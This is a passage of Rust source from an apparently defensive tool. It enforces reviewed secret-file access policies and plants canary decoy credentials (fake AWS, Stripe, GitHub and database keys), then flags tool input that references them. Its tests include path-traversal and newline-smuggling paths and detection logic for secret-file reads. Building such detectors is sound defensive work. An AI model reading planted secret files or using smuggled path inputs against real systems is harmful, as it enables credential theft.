            }
            if !hex(expected_sha256, 64) {
                return Err("Expected the exact reviewed SHA-256".into());
            }
            let bytes = custody::capture_private(path, uid)?;
            let loaded = decode_policy(&bytes)?;
            if loaded.policy.owner_uid != uid {
                return Err("Policy belongs to a different user".into());
            }
            if loaded.sha256 != expected_sha256 {
                return Err("Policy bytes differ from the reviewed SHA-256".into());
            }
            for secret in &loaded.policy.secrets {
                let (path, device, inode) = custody::secret(Path::new(&secret.path), uid)?;
                if path != secret.path || device != secret.device || inode != secret.inode {
                    return Err("An enrolled file was replaced or its canonical path changed; re-enroll and review it".into());
                }
            }
            // Install the single bounded descriptor capture; never reopen user
            // input or reserialize after its exact reviewed hash was verified.
            custody::install(&loaded, &bytes)?;
            Ok(
                json!({"schema":1,"owner_uid":uid,"policy_path":format!("{POLICY_DIRECTORY}/{uid}.json"),"policy_sha256":loaded.sha256,"policy":loaded.policy,
                "sensor_acknowledged":false,"message":"Policy installed. Monitoring remains pending until the live sensor acknowledges this exact revision and hash."}),
            )
        }
        #[cfg(not(unix))]
        {
            let _ = (path, expected_sha256, uid);
            Err("Local secret policy operations require macOS".into())
        }
    }
    pub fn status() -> Result<Value, String> {
        let uid = current_uid()?;
        let loaded = load_for_uid(uid)?;
        let sensor = crate::canary_watcher::secret_access::sensor_status(uid, loaded.as_ref());
        let monitor = crate::canary_watcher::secret_access::monitor_status();
        let recent_access = crate::canary_watcher::secret_access::recent_access();
        Ok(
            json!({"schema":1,"owner_uid":uid,"policy":loaded.as_ref().map(|value|&value.policy),
            "policy_sha256":loaded.as_ref().map(|value|&value.sha256),"sensor":sensor,"monitor":monitor,"recent_access":recent_access}),
        )
    }
    pub fn run_command(command: SecretCommand) {
        let result = match command {
            SecretCommand::Plan {
                scan_root,
                secret,
                policy,
                output,
                ..
            } => plan(scan_root.as_deref(), &secret, policy.as_deref(), &output),
            SecretCommand::Approve {
                policy,
                secret_id,
                application,
                output,
                ..
            } => edit(&policy, &secret_id, Some(&application), None, &output),
            SecretCommand::Revoke {
                policy,
                secret_id,
                reader_cdhash,
                output,
                ..
            } => edit(&policy, &secret_id, None, Some(&reader_cdhash), &output),
            SecretCommand::Forget {
                policy,
                secret_id,
                output,
                ..
            } => edit(&policy, &secret_id, None, None, &output),
            SecretCommand::Apply {
                policy,
                sha256,
                owner_uid,
                ..
            } => apply(&policy, &sha256, owner_uid),
            SecretCommand::Status { .. } => status(),
        };
        match result {
            Ok(value) => println!("{}", serde_json::to_string_pretty(&value).unwrap()),
            Err(error) => {
                println!("{}", json!({"schema":1,"success":false,"error":error}));
                std::process::exit(1);
            }
        }
    }

    #[cfg(test)]
    mod tests {
        use super::*;
        fn reader() -> Reader {
            Reader {
                cdhash: "a".repeat(40),
                signing_id: "is.example.Reader".into(),
                team_id: "EXAMPLETEAM".into(),
                platform_binary: false,
            }
        }
        fn policy() -> Policy {
            Policy {
                schema: 1,
                owner_uid: 501,
                revision: "1".repeat(32),
                base_policy_sha256: None,
                secrets: vec![Secret {
                    id: "2".repeat(32),
                    path: "/Users/fixture/.env".into(),
                    device: 1,
                    inode: 7,
                    readers: vec![reader()],
                }],
            }
        }
        #[test]
        fn strict_schema_requires_explicit_base_and_never_accepts_extra_secret_fields() {
            let value = policy();
            let bytes = serde_json::to_vec(&value).unwrap();
            assert_eq!(decode_policy(&bytes).unwrap().policy, value);
            assert!(decode_policy(b"{}").is_err());
            let mut document = serde_json::to_value(&value).unwrap();
            document
                .as_object_mut()
                .unwrap()
                .remove("base_policy_sha256");
            assert!(decode_policy(&serde_json::to_vec(&document).unwrap()).is_err());
            document = serde_json::to_value(&value).unwrap();
            document["secrets"][0]["secret_value"] = json!("must never enter a policy");
            assert!(decode_policy(&serde_json::to_vec(&document).unwrap()).is_err());
            let duplicate = String::from_utf8(bytes).unwrap().replacen(
                "\"schema\":1",
                "\"schema\":1,\"schema\":1",
                1,
            );
            assert!(decode_policy(duplicate.as_bytes()).is_err());
            assert!(decode_policy(&vec![b' '; MAX_POLICY_BYTES + 1]).is_err());
        }
        #[test]
        fn policy_rejects_paths_aliases_id_collisions_and_broad_reader_permissions() {
            for path in [
                "relative",
                "/Users/../secret",
                "/Users//secret",
                "/Users/./secret",
                "/Users/file\nsecret",
                "/",
            ] {
                let mut value = policy();
                value.secrets[0].path = path.into();
                assert!(validate_policy(&value).is_err());
            }
            let mut value = policy();
            value.secrets.push(value.secrets[0].clone());
            assert!(validate_policy(&value).is_err());
            value = policy();
            let mut alias = value.secrets[0].clone();
            alias.id = "3".repeat(32);
            alias.path = "/Users/fixture/alias".into();
            value.secrets.push(alias);
            assert!(validate_policy(&value).is_err());
            for invalid in [
                Reader {
                    cdhash: "*".into(),
                    ..reader()
                },
                Reader {
                    cdhash: "0".repeat(40),
                    ..reader()
                },
                Reader {
                    signing_id: String::new(),
                    ..reader()
                },
                Reader {
                    team_id: String::new(),
                    ..reader()
                },
            ] {
                let mut value = policy();
                value.secrets[0].readers = vec![invalid];
                assert!(validate_policy(&value).is_err());
            }
            let mut empty = policy();
            empty.secrets.clear();
            assert!(validate_policy(&empty).is_ok());
            empty.secrets = vec![policy().secrets[0].clone(); MAX_SECRETS + 1];
            assert!(validate_policy(&empty).is_err());
        }
        #[test]
        fn exact_base_hash_and_fresh_revision_prevent_lost_updates() {
            let old = decode_policy(&serde_json::to_vec(&policy()).unwrap()).unwrap();
            let mut next = policy();
            next.revision = "3".repeat(32);
            assert!(check_base(&next, None).is_ok());
            assert!(check_base(&next, Some(&old)).is_err());
            next.base_policy_sha256 = Some(old.sha256.clone());
            assert!(check_base(&next, Some(&old)).is_ok());
            next.revision = old.policy.revision.clone();
            assert!(check_base(&next, Some(&old)).is_err());
            next.revision = "3".repeat(32);
            next.base_policy_sha256 = Some("0".repeat(64));
            assert!(check_base(&next, Some(&old)).is_err());
        }
        #[test]
        fn reader_identity_requires_signed_code_metadata_and_endorsed_platform_marker() {
            let metadata=format!("Identifier=is.example.Reader\nCDHash={}\nSignature size=1200\nTeamIdentifier=EXAMPLETEAM\nCodeDirectory flags=0x10000(runtime)\n","a".repeat(40));
            assert_eq!(parse_reader_metadata(&metadata, false).unwrap(), reader());
            for altered in [
                metadata.replace("runtime", "adhoc"),
                metadata.replace("Signature size=1200", "Signature=adhoc"),
                metadata.replace("Signature size=1200", "Signature size=0"),
                format!("{metadata}CDHash={}\n", "b".repeat(40)),
            ] {
                assert!(parse_reader_metadata(&altered, false).is_err());
            }
            let platform = format!(
                "{}Platform identifier=26\n",
                metadata.replace("TeamIdentifier=EXAMPLETEAM", "TeamIdentifier=not set")
            );
            assert!(parse_reader_metadata(&platform, false).is_err());
            assert!(
                parse_reader_metadata(&platform, true)
                    .unwrap()
                    .platform_binary
            );
        }
        #[cfg(unix)]
        fn temporary() -> PathBuf {
            use std::os::unix::fs::PermissionsExt;
            let path = std::env::temp_dir().join(format!(
                "hedgehog-secret-policy-test-{}",
                super::super::random_hex(32)
            ));
            std::fs::create_dir(&path).unwrap();
            std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o700)).unwrap();
            path.canonicalize().unwrap()
        }
        #[test]
        #[cfg(unix)]
        fn private_input_rejects_permissions_other_owners_symlinks_and_hardlinks() {
            use std::os::unix::fs::{symlink, PermissionsExt};
            let root = temporary();
            let input = root.join("policy.json");
            let uid = unsafe { libc::geteuid() };
            let mut value = policy();
            value.owner_uid = uid;
            custody::write_new(&input, &serde_json::to_vec(&value).unwrap(), uid).unwrap();
            assert!(custody::private(&input, uid).is_ok());
            assert!(custody::private(&input, uid.wrapping_add(1)).is_err());
            assert!(custody::write_new(&input, b"overwrite", uid).is_err());
            std::fs::set_permissions(&input, std::fs::Permissions::from_mode(0o644)).unwrap();
            assert!(custody::private(&input, uid).is_err());
            std::fs::set_permissions(&input, std::fs::Permissions::from_mode(0o600)).unwrap();
            symlink(&input, root.join("link")).unwrap();
            assert!(custody::private(&root.join("link"), uid).is_err());
            std::fs::hard_link(&input, root.join("hardlink")).unwrap();
            assert!(custody::private(&input, uid).is_err());
            std::fs::remove_dir_all(root).unwrap();
        }
        #[test]
        #[cfg(any(target_os = "macos", target_os = "linux"))]
        fn scan_plan_protects_government_marked_files_silently() {
            use std::sync::{atomic::AtomicBool, Arc};
            let root = temporary();
            std::fs::write(root.join("brief.txt"), "SECRET//NOFORN\n").unwrap();
            std::fs::write(root.join("keys.txt"), "AKIAIOSFODNN7EXAMPLE\n").unwrap();
            std::fs::write(root.join("plain.txt"), "nothing here\n").unwrap();
            let report = crate::content_scanner::scan_directory_checked(
                &root,
                &crate::content_scanner::ScanConfig::default(),
                &Arc::new(AtomicBool::new(false)),
                None,
            );
            assert!(report.complete, "{report:?}");
            assert!(report
                .results
                .iter()
                .all(|r| !crate::content_scanner::is_silent(&r.finding)));
            let mut paths = protected_paths(report);
            paths.sort();
            assert_eq!(paths, vec![root.join("brief.txt"), root.join("keys.txt")]);
            std::fs::remove_dir_all(root).unwrap();
        }
        #[test]
        #[cfg(target_os = "macos")]
        fn explicit_plan_keeps_only_metadata_and_reenrollment_clears_reader_approvals() {
            let root = temporary();
            let secret = root.join(".env");
            let base = root.join("base.json");
            let uid = unsafe { libc::geteuid() };
            std::fs::write(&secret, b"SYNTHETIC_SECRET_CONTENT_MUST_NOT_BE_PERSISTED").unwrap();
            let mut empty = policy();
            empty.owner_uid = uid;
            empty.secrets.clear();
            save(&empty, &base).unwrap();
            let first = plan(
                None,
                &[secret.clone()],
                Some(&base),
                &root.join("first.json"),
            )
            .unwrap();
            assert!(!first.to_string().contains("SYNTHETIC_SECRET_CONTENT"));
            let mut enrolled: Policy = serde_json::from_value(first["policy"].clone()).unwrap();
            enrolled.secrets[0].readers.push(reader());
            save(&enrolled, &root.join("approved.json")).unwrap();
            let unchanged = plan(
                None,
                &[secret.clone()],
                Some(&root.join("approved.json")),
                &root.join("unchanged.json"),
            )
            .unwrap();
            assert_eq!(
                unchanged["policy"]["secrets"][0]["readers"]
                    .as_array()
                    .unwrap()
                    .len(),
                1
            );
            std::fs::rename(&secret, root.join("old-file")).unwrap();
            std::fs::write(&secret, b"replacement").unwrap();
            let replacement = plan(
                None,
                &[secret],
                Some(&root.join("approved.json")),
                &root.join("replacement.json"),
            )
            .unwrap();
            assert_ne!(
                replacement["policy"]["secrets"][0]["inode"],
                enrolled.secrets[0].inode
            );
            assert_eq!(replacement["policy"]["secrets"][0]["readers"], json!([]));
            assert_ne!(
                replacement["policy"]["secrets"][0]["id"],
                enrolled.secrets[0].id
            );
            std::fs::remove_dir_all(root).unwrap();
        }
        #[test]
        #[cfg(target_os = "macos")]
        fn drafts_support_revoke_forget_and_refuse_partial_scan_results() {
            use std::os::unix::fs::symlink;
            let root = temporary();
            let uid = unsafe { libc::geteuid() };
            let mut value = policy();
            value.owner_uid = uid;
            save(&value, &root.join("base.json")).unwrap();
            let revoke = edit(
                &root.join("base.json"),
                &value.secrets[0].id,
                None,
                Some(&reader().cdhash),
                &root.join("revoke.json"),
            )
            .unwrap();
            assert_eq!(revoke["policy"]["secrets"][0]["readers"], json!([]));
            let forget = edit(
                &root.join("revoke.json"),
                &value.secrets[0].id,
                None,
                None,
                &root.join("forget.json"),
            )
            .unwrap();
            assert_eq!(forget["policy"]["secrets"], json!([]));
            let scan = root.join("scan");
            std::fs::create_dir(&scan).unwrap();
            symlink(root.join("missing"), scan.join("link")).unwrap();
            assert!(plan(
                Some(&scan),
                &[],
                Some(&root.join("forget.json")),
                &root.join("partial.json")
            )
            .is_err());
            assert!(!root.join("partial.json").exists());
            std::fs::remove_dir_all(root).unwrap();
        }
    }
}

/// Registry file location (encrypted).
fn registry_path() -> PathBuf {
    crate::config::config_dir().join("monitor.enc")
}

/// Legacy plaintext registry path (for migration).
fn legacy_registry_path() -> PathBuf {
    crate::config::config_dir().join("canaries.json")
}

/// Alert log file location.
fn alerts_path() -> PathBuf {
    crate::config::config_dir().join("credential_alerts.json")
}

/// Types of canary tokens we generate.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum CanaryType {
    AwsAccessKey,
    StripeSecretKey,
    GitHubPat,
    GenericApiKey,
    DbPassword,
}

impl std::fmt::Display for CanaryType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            CanaryType::AwsAccessKey => write!(f, "AWS Access Key"),
            CanaryType::StripeSecretKey => write!(f, "Stripe Secret Key"),
            CanaryType::GitHubPat => write!(f, "GitHub PAT"),
            CanaryType::GenericApiKey => write!(f, "Generic API Key"),
            CanaryType::DbPassword => write!(f, "DB Password"),
        }
    }
}

/// A single canary token.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CanaryToken {
    pub id: String,
    pub token_type: CanaryType,
    /// The actual fake secret value.
    pub value: String,
    /// Human-readable label (e.g., "AWS_ACCESS_KEY_ID").
    pub env_name: String,
    /// Explicit placements; filenames may contain commas.
    pub placements: Vec<CanaryPlacement>,
    /// When this canary was created (ISO 8601).
    pub created_at: String,
}

/// File identity is used with exact bytes before deleting an owned decoy.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct CanaryFileIdentity {
    pub device: u64,
    pub inode: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct CanaryPlacement {
    pub id: String,
    pub path: String,
    /// Legacy placements have no deletion authority or verified identity.
    pub identity: Option<CanaryFileIdentity>,
    /// Only files created by this version carry deletion authority.
    pub expected_content: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CanaryRegistry {
    pub version: u32,
    pub tokens: Vec<CanaryToken>,
}

impl Default for CanaryRegistry {
    fn default() -> Self {
        Self {
            version: REGISTRY_VERSION,
            tokens: Vec::new(),
        }
    }
}

/// An alert triggered when a canary is detected.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CanaryAlert {
    pub token_type: String,
    pub token_value: String,
    pub detected_in: String,
    pub context: String,
    pub timestamp: String,
}

/// Generate a random alphanumeric string of given length.
fn random_alnum(len: usize) -> String {
    let mut rng = rand::thread_rng();
    let chars: Vec<char> = (0..len)
        .map(|_| {
            let idx = rng.gen_range(0..62);
            if idx < 10 {
                (b'0' + idx) as char
            } else if idx < 36 {
                (b'A' + idx - 10) as char
            } else {
                (b'a' + idx - 36) as char
            }
        })
        .collect();
    chars.into_iter().collect()
}

/// Generate a random hex string of given length.
fn random_hex(len: usize) -> String {
    let mut rng = rand::thread_rng();
    (0..len)
        .map(|_| {
            let idx = rng.gen_range(0..16);
            if idx < 10 {
                (b'0' + idx) as char
            } else {
                (b'a' + idx - 10) as char
            }
        })
        .collect()
}

/// Generate a set of canary tokens with realistic env var names.
pub fn generate_canaries() -> Vec<CanaryToken> {
    let now = chrono::Utc::now().to_rfc3339();

    // AWS secret key (the one attackers actually want — access key ID is
    // useless without the secret key, and the secret key has no fixed prefix)
    let aws_secret = format!("{}{}", random_alnum(20), random_alnum(20));

    vec![
        CanaryToken {
            id: random_hex(32),
            token_type: CanaryType::AwsAccessKey,
            value: format!("AKIA{}", random_alnum(16)),
            env_name: "AWS_ACCESS_KEY_ID".to_string(),
            placements: Vec::new(),
            created_at: now.clone(),
        },
        CanaryToken {
            id: random_hex(32),
            token_type: CanaryType::GenericApiKey,
            value: aws_secret,
            env_name: "AWS_SECRET_ACCESS_KEY".to_string(),
            placements: Vec::new(),
            created_at: now.clone(),
        },
        CanaryToken {
            id: random_hex(32),
            token_type: CanaryType::StripeSecretKey,
            value: format!("sk_live_{}", random_alnum(24)),
            env_name: "STRIPE_SECRET_KEY".to_string(),
            placements: Vec::new(),
            created_at: now.clone(),
        },
        CanaryToken {
            id: random_hex(32),
            token_type: CanaryType::GitHubPat,
            value: format!("ghp_{}", random_alnum(36)),
            env_name: "GITHUB_TOKEN".to_string(),
            placements: Vec::new(),
            created_at: now.clone(),
        },
        CanaryToken {
            id: random_hex(32),
            token_type: CanaryType::DbPassword,
            value: format!(
                "postgres://admin:{}@db.internal:5432/production",
                random_alnum(24)
            ),
            env_name: "DATABASE_URL".to_string(),
            placements: Vec::new(),
            created_at: now.clone(),
        },
        CanaryToken {
            id: random_hex(32),
            token_type: CanaryType::GenericApiKey,
            value: format!("SG.{}.{}", random_alnum(22), random_alnum(43)),
            env_name: "SENDGRID_API_KEY".to_string(),
            placements: Vec::new(),
            created_at: now,
        },
    ]
}

#[derive(Deserialize)]
struct LegacyRegistry {
    tokens: Vec<LegacyToken>,
}

#[derive(Deserialize)]
struct LegacyToken {
    token_type: CanaryType,
    value: String,
    env_name: String,
    placed_in: Option<String>,
    created_at: String,
}

fn validate_registry(registry: &CanaryRegistry) -> Result<(), String> {
    if registry.version != REGISTRY_VERSION {
        return Err(format!(
            "Unsupported canary registry version {}",
            registry.version
        ));
    }
    let mut ids = std::collections::HashSet::new();
    let mut placements = std::collections::HashMap::new();
    for token in &registry.tokens {
        if token.id.len() != 32
            || !token.id.bytes().all(|b| b.is_ascii_hexdigit())
            || !ids.insert(&token.id)
        {
            return Err("Invalid or duplicate canary token ID".into());
        }
        if token.value.is_empty() {
            return Err("Canary token value is empty".into());
        }
        for placement in &token.placements {
            if placement.id.len() != 32
                || !placement.id.bytes().all(|b| b.is_ascii_hexdigit())
                || !Path::new(&placement.path).is_absolute()
            {
                return Err("Canary placement must have a stable ID and absolute path".into());
            }
            if let Some(previous) = placements.insert(&placement.id, placement) {
                if previous != placement {
                    return Err(
                        "Canary placement ID has inconsistent path or ownership data".into(),
                    );
                }
            }
            if placement.expected_content.is_some() && placement.identity.is_none() {
                return Err("Owned canary placement has no file identity".into());
            }
        }
    }
    Ok(())
}

fn decode_registry(bytes: &[u8]) -> Result<(CanaryRegistry, bool), String> {
    let value: serde_json::Value =
        serde_json::from_slice(bytes).map_err(|e| format!("Corrupt canary registry: {e}"))?;
    if value.get("version").is_some() {
        let registry: CanaryRegistry =
            serde_json::from_value(value).map_err(|e| format!("Invalid canary registry: {e}"))?;
        validate_registry(&registry)?;
        return Ok((registry, false));
    }
    let legacy: LegacyRegistry = serde_json::from_value(value)
        .map_err(|e| format!("Invalid legacy canary registry: {e}"))?;
    let mut registry = CanaryRegistry::default();
    let mut paths = std::collections::HashMap::<String, String>::new();
    for token in legacy.tokens {
        let mut placements = Vec::new();
        if let Some(path) = token.placed_in.filter(|p| !p.is_empty()) {
            // The legacy delimiter is also valid in a filename. Guessing would
            // silently watch (or later remove) the wrong file. Preserve source.
            if path.contains(", ") || !Path::new(&path).is_absolute() {
                return Err("Legacy canary placement is ambiguous or relative. Preserve the registry, verify each original path, and recreate these decoys explicitly; no files were changed".into());
            }
            let id = paths
                .entry(path.clone())
                .or_insert_with(|| random_hex(32))
                .clone();
            placements.push(CanaryPlacement {
                id,
                path,
                identity: None,
                expected_content: None,
            });
        }
        registry.tokens.push(CanaryToken {
            id: random_hex(32),
            token_type: token.token_type,
            value: token.value,
            env_name: token.env_name,
            placements,
            created_at: token.created_at,
        });
    }
    validate_registry(&registry)?;
    Ok((registry, true))
}

fn path_present(path: &Path) -> Result<bool, String> {
    match std::fs::symlink_metadata(path) {
        Ok(_) => Ok(true),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(false),
        Err(e) => Err(format!("Cannot inspect {}: {e}", path.display())),
    }
}

fn load_registry_at(
    encrypted: &Path,
    legacy: &Path,
    decrypt: impl Fn(&Path) -> Result<Vec<u8>, String>,
    persist: impl Fn(&Path, &[u8]) -> Result<(), String>,
) -> Result<CanaryRegistry, String> {
    let encrypted_present = path_present(encrypted)?;
    let (registry, migrated) = if encrypted_present {
        // Corruption must never fall back to a stale plaintext file or emptiness.
        decode_registry(&decrypt(encrypted)?)?
    } else if path_present(legacy)? {
        let (mut registry, _) =
            decode_registry(&crate::encrypted_store::read_regular_file(legacy)?)?;
        // Plaintext import cannot grant deletion authority, even if someone
        // manually copied a newer schema into the legacy location.
        for placement in registry
            .tokens
            .iter_mut()
            .flat_map(|token| &mut token.placements)
        {
            placement.identity = None;
            placement.expected_content = None;
        }
        (registry, true)
    } else {
        return Ok(CanaryRegistry::default());
    };
    if migrated {
        let bytes = serde_json::to_vec(&registry).map_err(|e| e.to_string())?;
        persist(encrypted, &bytes).map_err(|e| {
            format!("Registry migration could not be saved; original preserved: {e}")
        })?;
        if !encrypted_present {
            // Do not follow symlinks; read_regular_file already rejected them.
            std::fs::remove_file(legacy).map_err(|e| {
                format!("Registry migrated, but legacy plaintext could not be removed: {e}")
            })?;
        }
    }
    Ok(registry)
}

/// Missing registration is empty; corrupt, unavailable or ambiguous state is an error.
pub fn registry_exists() -> Result<bool, String> {
    Ok(path_present(&registry_path())? || path_present(&legacy_registry_path())?)
}

/// Keep this value alive while consuming observations against its registry.
/// Cooperating placement changes cannot commit until the snapshot is dropped.
pub struct LockedRegistrySnapshot {
    pub registry: CanaryRegistry,
    pub exists: bool,
    _lock: crate::encrypted_store::StorageLock,
}

pub fn locked_registry_snapshot() -> Result<LockedRegistrySnapshot, String> {
    let lock = crate::encrypted_store::storage_lock(&registry_path().with_extension("lock"))?;
    let exists = registry_exists()?;
    let registry = load_registry_unlocked()?;
    Ok(LockedRegistrySnapshot {
        registry,
        exists,
        _lock: lock,
    })
}

pub fn try_load_registry() -> Result<CanaryRegistry, String> {
    // An unconfigured hook must not create application state just to check it.
    if !registry_exists()? {
        return Ok(CanaryRegistry::default());
    }
    let _lock = crate::encrypted_store::storage_lock(&registry_path().with_extension("lock"))?;
    load_registry_unlocked()
}

fn load_registry_unlocked() -> Result<CanaryRegistry, String> {
    load_registry_at(
        &registry_path(),
        &legacy_registry_path(),
        crate::encrypted_store::decrypt_from_file,
        crate::encrypted_store::encrypt_to_file,
    )
}

/// Save only a valid current schema. Never replace unreadable registration from a caller.
pub fn save_registry(registry: &CanaryRegistry) -> Result<(), String> {
    validate_registry(registry)?;
    let bytes = serde_json::to_vec(registry).map_err(|e| e.to_string())?;
    crate::encrypted_store::encrypt_to_file(&registry_path(), &bytes)
}

fn required_registry() -> CanaryRegistry {
    try_load_registry().unwrap_or_else(|e| {
        eprintln!("Canary registration unavailable: {e}");
        std::process::exit(1)
    })
}

/// Persist a local observation; malformed or unwritable logs are visible failures.
pub fn log_alert(alert: &CanaryAlert) -> Result<(), String> {
    let path = alerts_path();
    let _lock = crate::encrypted_store::storage_lock(&path.with_extension("lock"))?;
    let mut alerts: Vec<CanaryAlert> = if path_present(&path)? {
        serde_json::from_slice(&crate::encrypted_store::read_regular_file(&path)?)
            .map_err(|e| format!("Canary alert log is corrupt: {e}"))?
    } else {
        Vec::new()
    };
    alerts.push(alert.clone());
    if alerts.len() > 1000 {
        alerts.drain(..alerts.len() - 1000);
    }
    crate::encrypted_store::write_private_atomic(
        &path,
        &serde_json::to_vec_pretty(&alerts).map_err(|e| e.to_string())?,
    )
}

/// Check if a command or file path references a monitored credential file.
pub fn check_file_access(text: &str) -> Result<Option<(String, String)>, String> {
    let registry = try_load_registry()?;
    if registry.tokens.is_empty() {
        return Ok(None);
    }

    // Collect unique canary file paths from the registry
    let mut canary_paths: Vec<String> = Vec::new();
    for token in &registry.tokens {
        for placement in &token.placements {
            if !canary_paths.contains(&placement.path) {
                canary_paths.push(placement.path.clone());
            }
        }
    }

    // Also check for the basename patterns — agents may use relative paths
    let canary_basenames: Vec<String> = canary_paths
        .iter()
        .filter_map(|p| {
            std::path::Path::new(p)
                .file_name()
                .and_then(|n| n.to_str())
                .map(|s| s.to_string())
        })
        .collect();

    // Check if text contains any canary file path (absolute or relative)
    for path in &canary_paths {
        if text.contains(path.as_str()) {
            let alert = CanaryAlert {
                token_type: "file_access".to_string(),
                token_value: path.clone(),
                detected_in: "canary_file_read".to_string(),
                context: "Registered canary reference in tool input; file access is not proven"
                    .to_string(),
                timestamp: chrono::Utc::now().to_rfc3339(),
            };
            log_alert(&alert)?;
            return Ok(Some((path.clone(), "absolute path reference".to_string())));
        }
    }

    for basename in &canary_basenames {
        if text.contains(basename.as_str()) {
            let alert = CanaryAlert {
                token_type: "file_access".to_string(),
                token_value: basename.clone(),
                detected_in: "canary_file_read".to_string(),
                context: "Registered canary reference in tool input; file access is not proven"
                    .to_string(),
                timestamp: chrono::Utc::now().to_rfc3339(),
            };
            log_alert(&alert)?;

            // Find full path for the message
            let full_path = canary_paths
                .iter()
                .find(|p| p.ends_with(basename.as_str()))
                .cloned()
                .unwrap_or_else(|| basename.clone());
            return Ok(Some((full_path, "filename reference".to_string())));
        }
    }

    Ok(None)
}

/// Check text against monitored credential values.
pub fn check_for_canary(text: &str, context: &str) -> Result<Option<CanaryToken>, String> {
    let registry = try_load_registry()?;
    if registry.tokens.is_empty() {
        return Ok(None);
    }

    for token in &registry.tokens {
        if text.contains(&token.value) {
            // Log the alert
            let alert = CanaryAlert {
                token_type: token.token_type.to_string(),
                token_value: token.id.clone(),
                detected_in: context.to_string(),
                context: "Registered canary reference in tool input; file access is not proven"
                    .to_string(),
                timestamp: chrono::Utc::now().to_rfc3339(),
            };
            log_alert(&alert)?;

            return Ok(Some(token.clone()));
        }
    }

    Ok(None)
}

/// Check multiple text fields against monitored credential values.
pub fn check_all_fields(fields: &[(&str, &str)]) -> Result<Option<(CanaryToken, String)>, String> {
    let registry = try_load_registry()?;
    if registry.tokens.is_empty() {
        return Ok(None);
    }

    for (context_name, text) in fields {
        for token in &registry.tokens {
            if text.contains(&token.value) {
                let alert = CanaryAlert {
                    token_type: token.token_type.to_string(),
                    token_value: token.id.clone(),
                    detected_in: context_name.to_string(),
                    context: "Registered canary reference in tool input; file access is not proven"
                        .to_string(),
                    timestamp: chrono::Utc::now().to_rfc3339(),
                };
                log_alert(&alert)?;

                return Ok(Some((token.clone(), context_name.to_string())));
            }
        }
    }

    Ok(None)
}

fn file_identity(metadata: &std::fs::Metadata) -> Option<CanaryFileIdentity> {
    #[cfg(unix)]
    {
        use std::os::unix::fs::MetadataExt;
        Some(CanaryFileIdentity {
            device: metadata.dev(),
            inode: metadata.ino(),
        })
    }
    #[cfg(not(unix))]
    {
        let _ = metadata;
        None
    }
}

fn decoy_content(tokens: &[CanaryToken]) -> String {
    let mut content = "# Gorse decoy credentials. Do not source or use as application configuration.\n# Synthetic values: local detection only, not service-backed alert tokens.\n".to_string();
    for token in tokens {
        content.push_str(&format!("{}={}\n", token.env_name, token.value));
    }
    content
}

/// A dedicated artifact avoids silently changing application or SDK configuration.
pub fn place_canaries(dir: &Path, tokens: &[CanaryToken]) -> Result<Vec<CanaryPlacement>, String> {
    let dir = dir
        .canonicalize()
        .map_err(|e| format!("Invalid placement directory: {e}"))?;
    let id = random_hex(32);
    let path = dir.join(format!(".hedgehog-canary-{id}.txt"));
    let path_string = path
        .to_str()
        .ok_or("Canary path must be valid UTF-8")?
        .to_string();
    let content = decoy_content(tokens);
    let mut options = std::fs::OpenOptions::new();
    options.write(true).create_new(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options
            .mode(0o600)
            .custom_flags(libc::O_NOFOLLOW | libc::O_CLOEXEC);
    }
    let mut file = options
        .open(&path)
        .map_err(|e| format!("Cannot exclusively create {}: {e}", path.display()))?;
    let result = (|| {
        file.write_all(content.as_bytes())
            .map_err(|e| e.to_string())?;
        file.sync_all().map_err(|e| e.to_string())?;
        let identity = file_identity(&file.metadata().map_err(|e| e.to_string())?);
        Ok(vec![CanaryPlacement {
            id,
            path: path_string,
            expected_content: identity.as_ref().map(|_| content),
            identity,
        }])
    })();
    drop(file);
    result.map_err(|e: String| {
        format!(
            "{e}; unregistered partial artifact preserved at {}",
            path.display()
        )
    })
}

fn matches_owned_file(path: &Path, placement: &CanaryPlacement) -> Result<bool, String> {
    let metadata = std::fs::symlink_metadata(path).map_err(|e| e.to_string())?;
    if !metadata.is_file()
        || placement.identity.is_none()
        || file_identity(&metadata) != placement.identity
    {
        return Ok(false);
    }
    let Some(expected) = &placement.expected_content else {
        return Ok(false);
    };
    Ok(crate::encrypted_store::read_regular_file(path)? == expected.as_bytes())
}

/// Quarantine first, then verify identity and contents before unlinking. If a
/// path was replaced during the rename, preserve it and never overwrite a new
/// file at its original path while restoring it.
fn remove_owned_placement(placement: &CanaryPlacement) -> Result<bool, String> {
    let path = Path::new(&placement.path);
    if !path_present(path)? {
        return Ok(false);
    }
    if !matches_owned_file(path, placement)? {
        return Err(format!(
            "Preserved modified, replaced, or unowned file: {}",
            path.display()
        ));
    }
    let quarantine = path
        .parent()
        .ok_or("Canary path has no parent")?
        .join(format!(".hedgehog-remove-{}", random_hex(32)));
    let mut builder = std::fs::DirBuilder::new();
    #[cfg(unix)]
    {
        use std::os::unix::fs::DirBuilderExt;
        builder.mode(0o700);
    }
    builder.create(&quarantine).map_err(|e| e.to_string())?;
    let held = quarantine.join("artifact");
    if let Err(e) = std::fs::rename(path, &held) {
        let _ = std::fs::remove_dir(&quarantine);
        return Err(format!("Could not quarantine {}: {e}", path.display()));
    }
    if matches_owned_file(&held, placement).unwrap_or(false) {
        std::fs::remove_file(&held)
            .map_err(|e| format!("Preserved artifact at {}: {e}", held.display()))?;
        let _ = std::fs::remove_dir(&quarantine);
        return Ok(true);
    }
    // Hard linking refuses to overwrite an original path created concurrently.
    if std::fs::hard_link(&held, path).is_ok() {
        let _ = std::fs::remove_file(&held);
        let _ = std::fs::remove_dir(&quarantine);
        Err(format!(
            "File changed during removal and was preserved: {}",
            path.display()
        ))
    } else {
        Err(format!(
            "File changed during removal; preserved at {}",
            held.display()
        ))
    }
}

fn create_registered(
    dir: &Path,
    registry: &mut CanaryRegistry,
    persist: impl FnOnce(&CanaryRegistry) -> Result<(), String>,
) -> Result<Vec<CanaryPlacement>, String> {
    let mut tokens = generate_canaries();
    let placements = place_canaries(dir, &tokens)?;
